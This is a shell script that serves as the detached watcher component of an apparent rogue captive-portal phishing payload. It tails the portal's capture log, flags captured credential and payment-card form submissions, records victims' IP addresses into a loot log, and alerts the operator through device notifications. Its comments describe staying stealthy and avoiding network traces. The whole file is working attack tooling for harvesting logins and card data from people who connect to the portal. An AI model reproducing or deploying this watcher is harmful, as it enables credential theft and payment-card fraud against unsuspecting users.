#!/bin/sh
# watcher.sh — KB Portal Whisperer detached watcher. Composed at deploy time:
#   cat triage.sh watcher.sh > /tmp/kbwhisper.sh  (triage first; we need its
#   functions; both files are ash-only and side-effect-free on source)
#   setsid ash /tmp/kbwhisper.sh &  -> watcher outlives the payload, not ssh.
#
# env (set by kb_whisper_start into the wrapper file):
#   KBW_CAP=/tmp/kbportal_capture.log  KBW_DNS=/tmp/kbportal_dns.log
#   KBW_MARKER=/root/loot/kb_portal/active
#   KBW_SENS=0 quiet (loot only) | 1 alerts (LCD) | 2 noisy (+vibrate/ringtone)
#   KBW_STATE=/root/loot/kb_portal     KBW_LIVE=$KBW_STATE/whisper.log
#
# DESIGN — quiet as a dragon: the watcher NEVER leaves evidence on the network
# path. It reads tmpfs logs only, alerts to the LCD/haptics only, appends a
# local triage line per event. No egress, no files on /mmc beyond loot.
# ALERT/VIBRATE/RINGTONE are best-effort from a detached proc (|| true):
# UI-collision rule says alert contexts must not open dialogs — ALERT is a
# notification, not a dialog, but every call is guarded anyway.

[ -n "${KBW_CAP:-}" ] || exit 1
: "${KBW_SENS:=1}" "${KBW_STATE:=/root/loot/kb_portal}" "${KBW_LIVE:=$KBW_STATE/whisper.log}"
: "${KBW_DNS:=/tmp/kbportal_dns.log}" "${KBW_MARKER:=/root/loot/kb_portal/active}"
PIDFILE=${KBW_PIDFILE:-/tmp/kbwhisper_watch.pid}
echo $$ > "$PIDFILE" 2>/dev/null
NOISE_FILE=${KBW_NOISE:-/tmp/kbwhisper_noise}   # scanner dedupe + one-ring memory

notify() { # level text  — level 1=alert, 2=alert+vibrate, 3=alert+ring
  [ "$KBW_SENS" = 0 ] && return 0
  ALERT "$2" >/dev/null 2>&1 || true
  if [ "$KBW_SENS" = 2 ] && [ "${1:-1}" = 2 ]; then VIBRATE "Whisper:d=4,o=5,b=200:r,r.,r.,r" >/dev/null 2>&1 || true; fi
  if [ "$KBW_SENS" = 2 ] && [ "${1:-1}" = 3 ] && [ ! -f "$NOISE_FILE.rang" ]; then
    # one soft chime per run — the "we heard a conversation" cue, never a loop
    RINGTONE "Chime:d=4,o=6,b=200:g#,p,e.,p" >/dev/null 2>&1 || true
    : > "$NOISE_FILE.rang" 2>/dev/null
  fi
}

# spawn baseline: pre-existing lines are NOT news (they were already judged
# by whoever ran the portal before; re-alerting old loot is the classic
# false-positive that trains the operator to ignore us)
LAST_LINES=$(wc -l < "$KBW_CAP" 2>/dev/null || echo 0)
LAST_LINES=$(echo "$LAST_LINES" | tr -dc '0-9'); : "${LAST_LINES:=0}"
while :; do
  [ -f "$KBW_MARKER" ] || exit 0        # KB Whisper Stop pulls the marker
  NOW_LINES=$(wc -l < "$KBW_CAP" 2>/dev/null || echo 0)
  NOW_LINES=$(echo "$NOW_LINES" | tr -dc '0-9'); : "${NOW_LINES:=0}"
  if [ "$NOW_LINES" -lt "$LAST_LINES" ]; then LAST_LINES=0; fi   # Stop truncated
  if [ "$NOW_LINES" -gt "$LAST_LINES" ]; then
    # exactly the lines we have not seen: skip FIRST line after spawn too
    NEWLINES=$(sed -n "$((LAST_LINES + 1)),${NOW_LINES}p" "$KBW_CAP" 2>/dev/null)
    LAST_LINES=$NOW_LINES
    while IFS= read -r L; do
      [ -n "$L" ] || continue
      TAG=$(triage_line "$L"); SCAN=$(scanner_of "$L"); GOLD=$(gold_of "$L")
      IP=$(echo "$L" | sed -n 's/.*|ra=\([0-9.:a-fA-F]*\).*/\1/p' | cut -c1-45)
      TS=$(date -u +%FT%TZ)
      case "$TAG" in
        CRED) echo "$TS CRED from $IP" >> "$KBW_LIVE" 2>/dev/null
              notify 2 "Whisper: credential POST from $IP" ;;
        CARD) echo "$TS CARD from $IP" >> "$KBW_LIVE" 2>/dev/null
              notify 2 "Whisper: CARD form POST from $IP" ;;
        FP)   echo "$TS FP from $IP" >> "$KBW_LIVE" 2>/dev/null ;;
        REQ)  echo "$TS req from $IP" >> "$KBW_LIVE" 2>/dev/null ;;
      esac
      if [ -n "$SCAN" ]; then
        if ! grep -q " $IP\$" "$NOISE_FILE" 2>/dev/null; then
          echo "$TS $SCAN $IP" >> "$KBW_LIVE" 2>/dev/null
          echo "$SCAN $IP" >> "$NOISE_FILE" 2>/dev/null
          notify 3 "Whisper: $SCAN crawler from $IP — URL was forwarded"
        fi
      fi
      if [ -n "$GOLD" ]; then
        echo "$TS GOLD zero-click from $IP" >> "$KBW_LIVE" 2>/dev/null
        notify 3 "Whisper: zero-click identifier via query string ($IP)"
      fi
    done <<EOF
$NEWLINES
EOF
  fi
  sleep 2
done
